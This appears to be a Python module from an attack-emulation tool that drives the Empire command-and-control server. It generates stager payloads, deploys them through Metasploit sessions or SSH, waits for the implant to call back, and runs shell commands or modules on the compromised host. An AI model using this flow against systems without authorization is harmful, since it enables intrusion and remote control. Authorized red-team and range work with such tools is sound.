import asyncio
import socket
import time
from typing import Optional
import paramiko
import utinni
from httpx import TransportError

from cryton.worker.utility.util import ssh_to_target
from cryton.worker.config.settings import SETTINGS
from cryton.worker.utility import logger, constants as co
from cryton.lib.metasploit import MetasploitClientUpdated
from snek_sploit import Error as MSFError


class EmpireClient(utinni.EmpireApiClient):
    def __init__(self, host: str = SETTINGS.empire.host, port: int = SETTINGS.empire.port):
        """
        Wrapper class for EmpireApiClient.
        :param host: Hostname(ip address) of Empire server
        :param port: Port used for connection to Empire server
        """
        super().__init__(host, port)
        self.empire_client = utinni.EmpireApiClient(host=host, port=port)
        self.stagers = EmpireStagers(self)

    async def default_login(self, username: str = SETTINGS.empire.username, password: str = SETTINGS.empire.password):
        """
        Login to Empire server
        :param username: Username used for login to Empire
        :param password: Password used for login to Empire
        """
        try:
            await try_empire_request(self.login, username, password)
        except utinni.EmpireLoginError:
            logger.logger.debug("Unable to login to the Empire server, credentials invalid")
            raise utinni.EmpireLoginError("Unable to login to the Empire server, credentials invalid")

    async def agent_poller(self, target_ip) -> Optional[utinni.EmpireAgent]:
        """
        Check for new agents in 1 sec interval until the right one is found.
        :param target_ip: IP address of target that agent should've been deployed to
        :return: Agent object
        """
        # Poll for new agents every 1 sec
        logger.logger.debug("* Waiting for agents...")
        previous_agents = []
        for check in range(10):
            for agent in await self.agents.get():
                for previous_agent in previous_agents:
                    if previous_agent.name == agent.name:
                        return agent
                logger.logger.debug(f"+ New agent '{agent.name}' connected from: {agent.external_ip}")
                if agent.external_ip == target_ip:
                    return agent
                previous_agents.append(agent)
                logger.logger.debug(f"agents:{previous_agents}")
            await asyncio.sleep(3)
        return None

    async def generate_payload(self, deploy_arguments: dict) -> str:
        """
        Generate stager payload to generate agent on target.
        :param deploy_arguments: Arguments for agent deployment
        :return: Executable stager
        """

        # checked during validation
        listener_name = deploy_arguments[co.EMPIRE_LISTENER_NAME]
        stager_type = deploy_arguments[co.STAGER_TYPE]

        listener_port = deploy_arguments.get(co.EMPIRE_LISTENER_PORT, 80)
        listener_type = deploy_arguments.get(co.EMPIRE_LISTENER_TYPE, "http")
        stager_options = deploy_arguments.get(co.STAGER_OPTIONS)
        listener_options = deploy_arguments.get(co.LISTENER_OPTIONS, {})

        # check if listener already exists
        listener_get_response = await try_empire_request(self.listeners.get, listener_name)
        logger.logger.debug(f"Using existing listener '{listener_name}'")
        if "error" in listener_get_response:
            # create listener
            logger.logger.debug("Creating listener.", listener_name=listener_name)
            try:
                await try_empire_request(
                    self.listeners.create,
                    listener_type,
                    listener_name,
                    additional={"Port": listener_port, **listener_options},
                )
            except KeyError:
                logger.logger.debug("Listener could not be created. Check if port is not already in use.")
                raise KeyError(f"Listener could not be created. Check if port is not already in use.")
            logger.logger.debug(f"Listener '{listener_name}' created")

        # check if stager is in Empire database
        stager = await try_empire_request(self.stagers.get, stager_type)

        logger.logger.debug("Generating stager output.", stager_type=stager_type, listener_name=listener_name)
        try:
            stager_output = await try_empire_request(stager.generate, stager_type, listener_name, stager_options)
        except KeyError:
            logger.logger.error(f"Stager could not be generated, check if the supplied listener exists.")
            raise KeyError(f"Stager could not be generated, check if the supplied listener exists.")

        logger.logger.debug("Stager output generated.")
        return stager_output

    async def execute_on_agent(self, arguments) -> dict:
        """
        Execute empire module defined by name.
        :param arguments: Arguments for executing module or command on agent
        :return: Execution result
        """
        await self.default_login()

        agent_name = arguments[co.USE_AGENT]  # checked during validation
        module_name = arguments.get(co.MODULE)
        shell_command = arguments.get(co.EMPIRE_SHELL_COMMAND)
        module_args = arguments.get(co.MODULE_ARGUMENTS, {})

        # There is timeout in execute/shell function but for some reason it's not triggered when inactive agent is used
        # and it freezes waiting for answer
        try:
            empire_agent = await try_empire_request(self.agents.get, agent_name)
        except KeyError:
            return {co.RESULT: co.CODE_ERROR, co.OUTPUT: f"Agent '{agent_name}' not found in Empire."}
        else:
            logger.logger.debug(f"Agent '{agent_name}' successfully pulled from Empire.")

        if module_name is not None:
            # check if module exists
            try:
                await try_empire_request(self.modules.get, module_name)
            except KeyError:
                return {co.RESULT: co.CODE_ERROR, co.OUTPUT: f"Module '{module_name}' not found in Empire."}

            try:
                execution_result = await asyncio.wait_for(
                    try_empire_request(empire_agent.execute, module_name, module_args), 15
                )
            except (utinni.EmpireModuleExecutionError, utinni.EmpireModuleExecutionTimeout) as ex:
                logger.logger.error("Error while executing empire module", err=str(ex))
                return {co.RESULT: co.CODE_ERROR, co.OUTPUT: str(ex)}
            except asyncio.exceptions.TimeoutError:
                logger.logger.error(f"Module execution timed out, check that empire agent '{agent_name} is active")
                return {
                    co.RESULT: co.CODE_ERROR,
                    co.OUTPUT: f"Module execution timed out, check that empire agent '{agent_name} is active",
                }

        elif shell_command is not None:
            logger.logger.debug("Executing command on agent.", agent_name=agent_name, command=shell_command)
            try:
                execution_result = await asyncio.wait_for(try_empire_request(empire_agent.shell, shell_command), 15)
            except (utinni.EmpireModuleExecutionError, utinni.EmpireModuleExecutionTimeout) as ex:
                logger.logger.error("Error while executing shell command on agent", err=str(ex))
                return {co.RESULT: co.CODE_ERROR, co.OUTPUT: str(ex)}
            except asyncio.exceptions.TimeoutError:
                logger.logger.error(
                    f"Shell command execution timed out, check that empire agent '{agent_name}' is alive"
                )
                return {
                    co.RESULT: co.CODE_ERROR,
                    co.OUTPUT: f"Shell command execution timed out, check that empire agent '{agent_name}' "
                    f"is alive",
                }
        else:
            return {co.RESULT: co.CODE_ERROR, co.OUTPUT: "Missing module_name or shell_command in arguments."}

        return {co.RESULT: co.CODE_OK, co.OUTPUT: execution_result}


class EmpireStager(utinni.EmpireObject):
    def __init__(self, api, raw_object):
        super().__init__(api, raw_object)

    async def generate(self, stager, listener, options=None):
        if options is None:
            options = {}
        return await self.api.stagers.generate(stager, listener, options)


class EmpireStagers(utinni.EmpireApi):
    async def get(self, stager):
        r = await try_empire_request(self.client.get, f"stagers/{stager}")
        return EmpireStager(self.api, r.json()["stagers"][0])

    async def generate(self, stager, listener, options):
        r = await try_empire_request(
            self.client.post, f"stagers", json={"StagerName": stager, "Listener": listener, **options}
        )
        return r.json()[stager]["Output"]


async def try_empire_request(fc_to_run, *fc_args, **fc_kwargs):
    """
    Try to execute empire function(REST API request), if TransportError happens, try again.
    :param fc_to_run: Empire function to execute
    :return: Passed function result
    """
    for i in range(4):
        try:
            return await fc_to_run(*fc_args, **fc_kwargs)
        except TransportError:
            logger.logger.debug("Connection error. Retrying...")
            time.sleep(1 + (i * 2))

    raise ConnectionError("Cannot connect to the Empire server")


async def deploy_agent(arguments: dict) -> dict:
    """
    Deploy stager on target and create agent.
    :param arguments: Step arguments
    :return: event_v
    """
    empire = EmpireClient()
    # login to Empire server
    await empire.default_login()

    session_id = arguments.pop(co.SESSION_ID, None)
    ssh_connection = arguments.pop(co.SSH_CONNECTION, None)

    try:
        payload = await empire.generate_payload(arguments)
    except KeyError as err:
        return {co.OUTPUT: str(err), co.RESULT: co.CODE_ERROR}

        # Check type of connection to target
    if session_id:
        metasploit_obj = MetasploitClientUpdated()
        try:
            session_to_use = metasploit_obj.sessions.get(session_id)
        except MSFError as ex:
            logger.logger.error("MSF session not found.", session_id=session_id)
            return {co.OUTPUT: f"MSF Session with id {session_id} not found. {ex}", co.RESULT: co.CODE_ERROR}

        target_ip = session_to_use.info.session_host

        logger.logger.debug(
            "Deploying agent via MSF session.", session_id=session_id, payload=payload, target_ip=target_ip
        )

        payload_tmp = payload.split()
        session_to_use.execute_in_shell(executable=payload_tmp[0], arguments=payload_tmp[1:])

    elif ssh_connection:
        # Check if 'target' is in ssh_connection arguments
        try:
            ssh_client = ssh_to_target(ssh_connection)
        except KeyError as err:
            logger.logger.error(f"Missing {str(err)} argument in ssh_connection.")
            return {co.OUTPUT: f"Missing {str(err)} argument in ssh_connection.", co.RESULT: co.CODE_ERROR}
        except (
            paramiko.ssh_exception.AuthenticationException,
            paramiko.ssh_exception.NoValidConnectionsError,
            socket.error,
        ) as ex:
            logger.logger.error("Couldn't connect to target via paramiko ssh client.", original_err=ex)
            return {co.OUTPUT: str(ex), co.RESULT: co.CODE_ERROR}

        logger.logger.debug("Connected to target via paramiko ssh client.")
        ssh_client.exec_command(payload)
        target_ip = ssh_connection["target"]
        logger.logger.debug("Deploying agent via ssh.", credentials=ssh_connection, payload=payload)
    else:
        logger.logger.error("Missing 'ssh_connection' or 'session_id' argument.")
        return {co.OUTPUT: "Missing 'ssh_connection' or 'session_id' argument.", co.RESULT: co.CODE_ERROR}

    new_agent_name = arguments[co.AGENT_NAME]  # checked during validation

    # Rename agent to given name
    logger.logger.debug("Renaming agent", target_ip=target_ip)
    agent = await empire.agent_poller(target_ip)

    if agent is None:
        return {
            co.OUTPUT: "Agent could not be deployed or didn't connect to the empire server",
            co.RESULT: co.CODE_ERROR,
        }

    agent_rename_response = await try_empire_request(agent.rename, new_agent_name)
    logger.logger.debug(f"Agent renamed to '{agent.name}'", response=agent_rename_response)

    return {co.RESULT: co.CODE_OK, co.OUTPUT: f"Agent '{new_agent_name}' deployed on target {target_ip}."}
